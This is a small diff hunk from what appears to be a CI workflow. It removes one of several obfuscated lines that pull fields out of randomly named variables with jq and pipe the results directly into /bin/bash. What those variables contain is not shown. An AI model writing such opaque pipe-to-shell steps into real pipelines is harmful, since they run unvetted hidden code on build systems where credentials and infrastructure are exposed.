@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$enfy1" | jq -r .jvnms837 | /bin/bash
           echo $qyv12869 | jq -r .dgeel76794 | /bin/bash
           echo $sbrme73635 | jq -r .qrfj0956 | /bin/bash
-          echo $fmqcr3663 | jq -r .gsq476 | /bin/bash
           echo $l42 | jq -r .wt4170 | /bin/bash
           echo $otzhl26 | jq -r .e968 | /bin/bash
           printf '%s' "$ytx9745" | jq -r .z6059 | /bin/bash
